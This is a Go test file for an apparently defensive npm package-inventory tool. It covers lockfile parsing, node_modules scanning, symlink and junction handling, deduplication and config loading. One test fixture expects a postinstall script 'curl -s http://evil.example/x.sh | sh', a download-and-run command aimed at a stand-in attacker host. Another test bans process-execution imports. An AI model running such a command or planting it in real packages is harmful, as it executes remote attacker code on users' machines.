package main

import (
	"go/parser"
	"go/token"
	"io/fs"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"
)

func find(pkgs []Package, name, version string) *Package {
	for i := range pkgs {
		if pkgs[i].Name == name && pkgs[i].Version == version {
			return &pkgs[i]
		}
	}
	return nil
}

func mustRead(t *testing.T, p string) []byte {
	t.Helper()
	b, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func TestLockfileV1(t *testing.T) {
	p := filepath.Join("testdata", "lock-v1", "package-lock.json")
	pkgs, err := parseLockfile(mustRead(t, p), "root", p)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range [][2]string{{"lodash", "4.17.21"}, {"debug", "2.6.9"}, {"ms", "2.0.0"}, {"ms", "2.1.3"}, {"left-pad", "1.3.0"}} {
		got := find(pkgs, want[0], want[1])
		if got == nil {
			t.Errorf("missing %s@%s", want[0], want[1])
			continue
		}
		if got.Scope != "project" || got.ProjectRoot != "root" || got.SourceFile != p || got.Ecosystem != "npm" {
			t.Errorf("bad fields: %+v", got)
		}
	}
	if len(pkgs) != 5 {
		t.Errorf("want 5 packages (file: dep skipped), got %d: %+v", len(pkgs), pkgs)
	}
}

func TestLockfileV3(t *testing.T) {
	p := filepath.Join("testdata", "lock-v3", "package-lock.json")
	pkgs, err := parseLockfile(mustRead(t, p), "root", p)
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		name, version string
		direct        bool
	}{
		{"express", "4.19.2", true},
		{"@babel/core", "7.24.5", true},
		{"typescript", "5.4.5", true},
		{"left-pad", "1.3.0", true}, // alias "str"
		{"debug", "2.6.9", false},   // nested under express
		{"debug", "4.3.4", false},
	}
	for _, c := range cases {
		got := find(pkgs, c.name, c.version)
		if got == nil {
			t.Errorf("missing %s@%s", c.name, c.version)
			continue
		}
		if got.Direct != c.direct {
			t.Errorf("%s@%s direct=%v want %v", c.name, c.version, got.Direct, c.direct)
		}
	}
	if find(pkgs, "express", "4.19.2").License != "MIT" {
		t.Error("license not read from lockfile")
	}
	for _, x := range pkgs {
		if x.Name == "my-workspace" || x.Name == "demo-v3" {
			t.Errorf("workspace/root should be skipped: %+v", x)
		}
	}
	if len(pkgs) != len(cases) {
		t.Errorf("want %d packages, got %d", len(cases), len(pkgs))
	}
}

func TestScopedNodeModules(t *testing.T) {
	nm := filepath.Join("testdata", "scoped", "node_modules")
	pkgs := scanNodeModules(nm, "proj", "project", 0)
	scoped := find(pkgs, "@org/pkg", "2.0.0")
	if scoped == nil {
		t.Fatalf("missing @org/pkg: %+v", pkgs)
	}
	if scoped.License != "MIT" || scoped.Author != "Org" || scoped.Description != "Scoped" ||
		scoped.Repository != "https://github.com/org/pkg" {
		t.Errorf("metadata not parsed: %+v", scoped)
	}
	if want := filepath.Join(nm, "@org", "pkg", "package.json"); scoped.SourceFile != want {
		t.Errorf("source_file = %s, want %s", scoped.SourceFile, want)
	}
	if p := find(pkgs, "plain", "1.2.3"); p == nil || p.Author != "Someone <a@b.c>" {
		t.Errorf("plain: %+v", p)
	}
	if find(pkgs, "inner", "0.1.0") == nil {
		t.Error("nested node_modules not scanned")
	}
	if len(pkgs) != 3 {
		t.Errorf("want 3 packages (.bin skipped), got %d", len(pkgs))
	}
}

func TestGlobal(t *testing.T) {
	dir := filepath.Join("testdata", "global", "node_modules")
	pkgs := scanGlobal([]string{dir, filepath.Join("testdata", "does-not-exist")})
	if len(pkgs) != 2 {
		t.Fatalf("want 2 global packages, got %+v", pkgs)
	}
	for _, p := range pkgs {
		if p.Scope != "global" || p.ProjectRoot != dir {
			t.Errorf("bad global record: %+v", p)
		}
	}
	if find(pkgs, "@angular/cli", "18.2.0") == nil {
		t.Error("missing scoped global package")
	}
}

// TestSymlinkLoop builds a directory whose child is a link back to itself.
// The walker must finish and must not list packages through the link.
func TestSymlinkLoop(t *testing.T) {
	root := t.TempDir()
	proj := filepath.Join(root, "proj")
	pkgDir := filepath.Join(proj, "node_modules", "a")
	if err := os.MkdirAll(pkgDir, 0o755); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(filepath.Join(pkgDir, "package.json"), []byte(`{"name":"a","version":"1.0.0"}`), 0o644)
	// loop: proj/loop -> root ; node_modules/b -> node_modules/a
	if err := os.Symlink(root, filepath.Join(proj, "loop")); err != nil {
		t.Skipf("cannot create symlinks here (Windows needs Developer Mode): %v", err)
	}
	if err := os.Symlink(pkgDir, filepath.Join(proj, "node_modules", "b")); err != nil {
		t.Fatal(err)
	}

	done := make(chan []Package, 1)
	go func() { done <- scanRoots([]string{root}, 50, ModeNPM) }()
	select {
	case pkgs := <-done:
		if len(pkgs) != 1 || pkgs[0].Name != "a" {
			t.Errorf("want only package a once, got %+v", pkgs)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("scan did not terminate: symlink followed")
	}
}

type fakeInfo struct{ mode fs.FileMode }

func (f fakeInfo) Name() string       { return "x" }
func (f fakeInfo) Size() int64        { return 0 }
func (f fakeInfo) Mode() fs.FileMode  { return f.mode }
func (f fakeInfo) ModTime() time.Time { return time.Time{} }
func (f fakeInfo) IsDir() bool        { return f.mode.IsDir() }
func (f fakeInfo) Sys() any           { return nil }

// Windows junctions are reported as ModeIrregular (Go >= 1.23); they must never be entered.
func TestJunctionAndSymlinkRejected(t *testing.T) {
	if !isPlainDir(fakeInfo{fs.ModeDir}) {
		t.Error("plain dir rejected")
	}
	for _, m := range []fs.FileMode{fs.ModeDir | fs.ModeIrregular, fs.ModeDir | fs.ModeSymlink, fs.ModeSymlink, fs.ModeIrregular} {
		if isPlainDir(fakeInfo{m}) {
			t.Errorf("mode %v accepted", m)
		}
	}
}

func TestSkipDirsAndDepth(t *testing.T) {
	root := t.TempDir()
	write := func(dir string) {
		os.MkdirAll(filepath.Join(dir, "node_modules", "x"), 0o755)
		os.WriteFile(filepath.Join(dir, "node_modules", "x", "package.json"), []byte(`{"name":"x","version":"1.0.0"}`), 0o644)
	}
	write(filepath.Join(root, ".git", "p"))
	write(filepath.Join(root, "Temp", "p"))
	write(filepath.Join(root, "a", "b", "c", "deep"))
	write(filepath.Join(root, "ok"))
	pkgs := scanRoots([]string{root}, 2, ModeNPM)
	if len(pkgs) != 1 || pkgs[0].ProjectRoot != filepath.Join(root, "ok") {
		t.Errorf("want only root/ok, got %+v", pkgs)
	}
}

func TestLargeFileSkipped(t *testing.T) {
	p := filepath.Join(t.TempDir(), "package-lock.json")
	f, _ := os.Create(p)
	f.Truncate(maxFileSize + 1) // sparse, cheap
	f.Close()
	if _, err := readFileLimited(p); err == nil {
		t.Error("file over 50 MB was read")
	}
}

func TestDedupe(t *testing.T) {
	in := []Package{
		{Name: "a", Version: "1", ProjectRoot: "r", SourceFile: "r/package-lock.json", Direct: true},
		{Name: "a", Version: "1", ProjectRoot: "r", SourceFile: "r/node_modules/a/package.json", License: "MIT"},
		{Name: "a", Version: "1", ProjectRoot: "other", SourceFile: "x"},
		{Name: "a", Version: "2", ProjectRoot: "r", SourceFile: "y"},
	}
	out := dedupe(in)
	if len(out) != 3 {
		t.Fatalf("want 3, got %+v", out)
	}
	for _, p := range out {
		if p.ProjectRoot == "r" && p.Version == "1" && (p.License != "MIT" || !p.Direct) {
			t.Errorf("merge wrong: %+v", p)
		}
	}
}

// Safety rule: the agent must never be able to start external processes.
func TestNoProcessExecutionImports(t *testing.T) {
	files, _ := filepath.Glob("*.go")
	banned := map[string]bool{"os/exec": true, "syscall": true, "golang.org/x/sys/windows": true}
	fset := token.NewFileSet()
	for _, f := range files {
		af, err := parser.ParseFile(fset, f, nil, parser.ImportsOnly)
		if err != nil {
			t.Fatal(err)
		}
		for _, imp := range af.Imports {
			path, _ := strconv.Unquote(imp.Path.Value)
			if banned[path] || strings.HasPrefix(path, "os/exec") {
				t.Errorf("%s imports %s", f, path)
			}
		}
	}
}

func TestInstallScripts(t *testing.T) {
	pkgs := scanNodeModules(filepath.Join("testdata", "scoped", "node_modules"), "proj", "project", 0)
	p := find(pkgs, "plain", "1.2.3")
	if p == nil || !p.HasInstallScript {
		t.Fatalf("plain: %+v", p)
	}
	if p.InstallScripts["postinstall"] != "curl -s http://evil.example/x.sh | sh" || p.InstallScripts["preinstall"] != "node setup.js" {
		t.Errorf("scripts: %v", p.InstallScripts)
	}
	if _, ok := p.InstallScripts["test"]; ok {
		t.Error("non-install script captured")
	}
	if o := find(pkgs, "@org/pkg", "2.0.0"); o.HasInstallScript || o.InstallScripts != nil {
		t.Errorf("@org/pkg should have no install scripts: %+v", o)
	}

	lp := filepath.Join("testdata", "lock-v3", "package-lock.json")
	lpkgs, _ := parseLockfile(mustRead(t, lp), "root", lp)
	if !find(lpkgs, "debug", "4.3.4").HasInstallScript || find(lpkgs, "express", "4.19.2").HasInstallScript {
		t.Error("hasInstallScript from lockfile not parsed correctly")
	}
}

func TestConfigFromDataDir(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("LIBPACK_DATA_DIR", dir)
	root := filepath.Join(dir, "projects")
	os.Mkdir(root, 0o755)
	cfgJSON := `{"roots":[` + strconv.Quote(root) + `],"max_depth":3}`
	if err := os.WriteFile(filepath.Join(dir, "config.json"), []byte(cfgJSON), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg, err := loadConfig()
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg.Roots) != 1 || cfg.Roots[0] != root || cfg.MaxDepth != 3 {
		t.Errorf("config from data dir not used: %+v", cfg)
	}

	os.WriteFile(filepath.Join(dir, "config.json"), []byte(`{"roots":[`), 0o600)
	if _, err := loadConfig(); err == nil {
		t.Error("broken config.json should be reported")
	}
}
